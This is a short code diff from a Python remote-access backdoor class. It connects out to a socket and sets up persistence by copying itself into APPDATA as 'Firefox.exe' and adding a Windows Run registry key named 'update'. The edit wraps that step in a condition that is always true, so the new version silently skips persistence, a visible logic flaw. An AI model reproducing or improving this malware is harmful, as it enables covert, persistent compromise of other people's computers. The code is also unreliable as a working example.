@@ -14,9 +14,12 @@ class Backdoor:
         self.con.connect((ip, port))
 
     def become_persistent(self):
-        file_loc = os.environ["appdata"] + "\\Firefox.exe"
-        shutil.copyfile(sys.executable, file_loc)
-        subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d {file_loc}', shell=True)
+        if os.environ["appdata"] + "\\Firefox.exe":
+            pass
+        else:
+            file_loc = os.environ["appdata"] + "\\Firefox.exe"
+            shutil.copyfile(sys.executable, file_loc)
+            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d {file_loc}', shell=True)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
